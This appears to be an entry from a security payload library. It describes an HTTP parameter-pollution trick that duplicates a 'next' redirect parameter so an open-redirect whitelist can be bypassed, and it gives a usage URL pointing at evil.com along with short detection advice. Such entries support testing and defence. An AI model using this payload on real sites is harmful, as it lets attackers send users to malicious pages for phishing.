---
id: 2ce20102-dc77-4ea6-8d78-265e984e9c5d
type: code
language: url-payload
verified: true
created_at: '2023-04-06T03:56:31.798533+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - parameter-pollution
validated: true
---

# Parameter-Pollution-Redirect-Bypass

## Code

```url-payload
?next=whitelisted.com&next=google.com
```

## Description

Duplicates params; app may use last one for redirect, bypassing whitelist on first.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| next=whitelisted.com | Safe param | next=good.com |
| next=google.com | Malicious | next=evil.com |

## Usage

/redirect?next=good.com&next=evil.com.

## Detection

- Limit to single instance per param.
- Validate all params against whitelist.

## Related

- [[procedures/Bypass-Open-URL-Redirection-Filters]]
